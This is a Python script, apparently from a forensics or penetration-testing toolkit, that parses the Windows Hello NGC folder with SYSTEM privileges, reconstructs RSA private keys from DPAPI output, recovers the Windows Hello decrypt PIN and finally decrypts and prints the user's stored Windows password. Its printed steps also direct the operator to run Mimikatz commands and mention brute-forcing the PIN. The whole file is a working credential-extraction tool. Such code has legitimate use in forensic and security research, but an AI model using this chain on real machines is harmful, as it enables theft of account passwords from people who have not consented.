#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Copyright 2020, Tijl "Photubias" Deneut <tijl.deneut@howest.be>


import optparse, os, sys, time

def reverseByte(bByteInput):
    sReversed = ''
    sHexInput = bByteInput.hex()
    for x in range(-1, -len(str(sHexInput)), -2): sReversed += sHexInput[x-1] + sHexInput[x]
    return bytes.fromhex(sReversed)

def parseTimestamp(bData):
    #return bData
    iTimestamp = int(reverseByte(bData).hex(), 16)
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(iTimestamp / 10000000 - 11644473600))

def parseProtectors(sPath, boolVerbose = False):
    arrProtectors = []
    for protector in os.listdir(sPath):
        ## name, provider, keyname, timestamp, data
        arrProtector = []
        arrProtector.append(protector)
        with open(os.path.join(sPath, protector, '1.dat'), 'rb') as f: arrProtector.append(f.read().decode('utf16').strip('\x00'))
        try:
            with open(os.path.join(sPath, protector, '2.dat'), 'rb') as f: arrProtector.append(f.read().decode('utf16').strip('\x00'))
        except:
            arrProtector.append('')
            print('[-] Protector "' + protector + '" is probably being stored in the TPM chip.')
        with open(os.path.join(sPath, protector, '9.dat'), 'rb') as f: arrProtector.append(parseTimestamp(f.read()))
        with open(os.path.join(sPath, protector, '15.dat'), 'rb') as f: arrProtector.append(f.read())
        arrProtectors.append(arrProtector)
        if boolVerbose:
            print('= ' + arrProtector[0] + ' =')
            print('[+] Provider  : ' + arrProtector[1])
            print('[+] Key Name  : ' + arrProtector[2])
            print('[+] Timestamp : ' + arrProtector[3])
            print('[+] Data Size : ' + str(len(arrProtector[4])) + ' byte(s)')
            print('')
    return arrProtectors


def parseItems(sPath, boolVerbose = False):
    arrHeadItems = []
    for sFolder in os.listdir(sPath):
        if not sFolder.startswith('{'): continue
        if len(os.listdir(os.path.join(sPath, sFolder))) <= 1: continue
        arrHeadItems.append(sFolder)
        if boolVerbose: print('= ' + sFolder + ' =')
        for sSubFolder in os.listdir(os.path.join(sPath, sFolder)):
            if sSubFolder.startswith('{'): continue
            ## filename, name, provider, keyname
            arrSubItems = []
            arrSubItems.append(sSubFolder)
            with open(os.path.join(sPath, sFolder, sSubFolder, '1.dat'), 'rb') as f: arrSubItems.append(f.read().decode('utf16').strip('\x00'))
            with open(os.path.join(sPath, sFolder, sSubFolder, '2.dat'), 'rb') as f: arrSubItems.append(f.read().decode('utf16').strip('\x00'))
            with open(os.path.join(sPath, sFolder, sSubFolder, '3.dat'), 'rb') as f: arrSubItems.append(f.read().decode('utf16').strip('\x00'))
            arrHeadItems.append(arrSubItems)
            if boolVerbose:
                print('* ' + arrSubItems[0])
                print('[+] Name     : ' + arrSubItems[1])
                print('[+] Provider : ' + arrSubItems[2])
                print('[+] Key Name : ' + arrSubItems[3])
                print('')
    return arrHeadItems

def constructRSAKEY(sDATA, boolVerbose = False):
    from Crypto.PublicKey import RSA
    def calcPrivateKey(e,p,q):
        def recurseFunction(a,b):
            if b==0:return (1,0)
            (q,r) = (a//b,a%b)
            (s,t) = recurseFunction(b,r)
            return (t, s-(q*t))
        t = (p-1)*(q-1) ## Euler's totient
        inv = recurseFunction(e,t)[0]
        if inv < 1: inv += t
        return inv
    
    ## Parsing based on: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/540b7b8b-2232-45c8-9d7c-af7a5d5218ed
    bDATA = bytes.fromhex(sDATA)
    if not bDATA[:4] == b'RSA2': exit('[-] Error: not an RSA key!')
    iBitlen = int(reverseByte(bDATA[4:8]).hex().encode(),16)
    iPubExpLen = int(reverseByte(bDATA[8:12]).hex().encode(),16)
    iModulusLen = int(reverseByte(bDATA[12:16]).hex().encode(),16)
    iPLen = int(reverseByte(bDATA[16:20]).hex().encode(),16)
    iQLen = int(reverseByte(bDATA[20:24]).hex().encode(),16)
    iOffset = 24
    iPubExp = int(reverseByte(bDATA[iOffset:iOffset+iPubExpLen]).hex().encode(),16)
    iOffset += iPubExpLen
    iModulus = int(bDATA[iOffset:iOffset+iModulusLen].hex().encode(),16)
    iOffset += iModulusLen
    iP = int(bDATA[iOffset:iOffset+iPLen].hex().encode(),16)
    iOffset += iPLen
    iQ = int(bDATA[iOffset:iOffset+iQLen].hex().encode(),16)
    if boolVerbose:
        print('[!] BitLength      : ' + str(iBitlen) + ' bit')
        print('[!] Modulus Length : ' + str(iModulusLen) + ' bytes')
        print('[!] Prime Lengths  : ' + str(iPLen) + ' bytes')
    if not iModulus == iP*iQ: exit('[-] Prime numbers do not currespond to the public key')
    iPrivateKey = calcPrivateKey(iPubExp, iP, iQ)
    try: oRSAKEY = RSA.construct((iModulus,iPubExp,iPrivateKey,iP,iQ)) ## oRSAKEY = RSA.construct((n,e,d,p,q))
    except: exit('[-] Error constructing RSA Key')
    return oRSAKEY

def parseDecryptPin(bData, boolVerbose = False):
    if len(bData)<(32*3): exit('[-] Decrypted data not long enough')
    bUnkPin = bData[-(32*3):-(32*2)]
    bDecryptPin = bData[-(32*2):-32]
    bSignPin = bData[-32:]
    if boolVerbose:
        print('Unknown PIN : ' + bUnkPin.hex())
        print('Decrypt PIN : ' + bDecryptPin.hex())
        print('Sign PIN    : ' + bSignPin.hex())
    return bDecryptPin

def check_parameters(options, args):
    if not args or len(args) != 1:
        sys.exit('You must provide an NGC folder.')

if __name__ == '__main__':
    """Utility core."""
    usage = (
        'usage: %prog ngc_folder\n\n'
        'It tries to parse system NGC Folder.\n'
        '\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\n'
        'Watch out: Folder path above requires SYSTEM privileges')

    parser = optparse.OptionParser(usage=usage)
    
    (options, args) = parser.parse_args()
    check_parameters(options, args)

    print('[!] Parsing the Ngc folder')
    arrGUIDs = os.listdir(args[0])
    for sGUID in arrGUIDs:
        print('[+] NGC GUID      : ' + sGUID)
        #os.path.join(args[0], sGUID, 'Protectors')
        with open(os.path.join(args[0], sGUID, '1.dat'), 'rb') as f: sUserSID = f.read().decode('utf16')
        print('[+] User SID      : ' + sUserSID)
        try: 
            with open(os.path.join(args[0], sGUID, '7.dat'), 'rb') as f: sMainProvider = f.read().decode('utf16')
        except: 
            exit('[-] Failed, are you running as System? (not Admin)')
        print('[+] Main Provider : ' + sMainProvider)

        print('\n== Protectors ==')
        arrProtectors = parseProtectors(os.path.join(args[0], sGUID, 'Protectors'), True)

        print('== Items ==')
        arrItems = parseItems(os.path.join(args[0], sGUID), True)

        
    ## Getting most interesting data
    bInputData = b''
    sGUID1 = arrGUIDs[0] ## NGC GUID
    for arrProtector in arrProtectors:
        if arrProtector[1] == 'Microsoft Software Key Storage Provider': 
            sGUID1 = arrProtector[2]
            bInputData = arrProtector[4]
    print('[+] Got InputData: ' + bInputData.hex())
    for arrItem in arrItems:
        if arrItem[1] == '//9DDC52DB-DC02-4A8C-B892-38DEF4FA748F': sGUID2 = arrItem[3]
    
    print('-' * 50)
    print('[!] It could end here, but let\'s calculate the NGC key')
    print('     For this, run DPAPI ngccryptokeys with this GUID and Windows Hello PIN (or use PIN brute) : ' + sGUID1)
    print('     In case of TPM usage, just press Enter')
    sRSAKEY = input('[?] Please copy paste the private key (starts with "52534132") : ')
    from Crypto.Cipher import PKCS1_v1_5
    if not sRSAKEY == '':
        oRSAKEY = constructRSAKEY(sRSAKEY)
        cipher = PKCS1_v1_5.new(oRSAKEY)
        try: bClearText = cipher.decrypt(bInputData,b'')
        except: exit('[-] Error decrypting the inputdata')
        bDecryptPin = parseDecryptPin(bClearText)
        print('[+] Got DecryptPIN : ' + bDecryptPin.hex().upper())
    else: 
        print('[!] For TPM, currently, use Mimikatz and run privilege::debug, token::elevate, ngc::pin /pin:1234 /guid:{FROM ABOVE}')
        bDecryptPin = bytes.fromhex(input('[?] Please copy paste just the "DECRYPTPIN" from Mimikatz : '))
    print('-' * 50)
    print('[!] OK, run DPAPI ngccryptokeys again with GUID ' + sGUID2 + ' and PIN ' + bDecryptPin.hex())
    sRSAKEY = input('[?] Please copy paste the private key (starts with "52534132") : ')
    oRSAKEY = constructRSAKEY(sRSAKEY)
    cipher = PKCS1_v1_5.new(oRSAKEY)
    print('-' * 50)
    print('[!] Final step, please run NGC vault decrypt and copy paste EncData, IV and EncPassword')
    sEncKey =      input('[?] EncData     : ')
    sIV =          input('[?] IV          : ')
    sEncPassword = input('[?] EncPassword : ')
    bEncKey = bytes.fromhex(sEncKey)
    bClearText = cipher.decrypt(bEncKey,b'')
    print(bClearText.hex())
    bIV = bytes.fromhex(sIV)
    bEncPassword = bytes.fromhex(sEncPassword)
    from Crypto.Cipher import AES
    oCipher = AES.new(bClearText, AES.MODE_CBC, bIV)
    bResult = oCipher.decrypt(bEncPassword)
    print('[+] !! RESULT !! ')
    print('  ' + bResult.decode('UTF-16LE').split('\x00')[0])
    
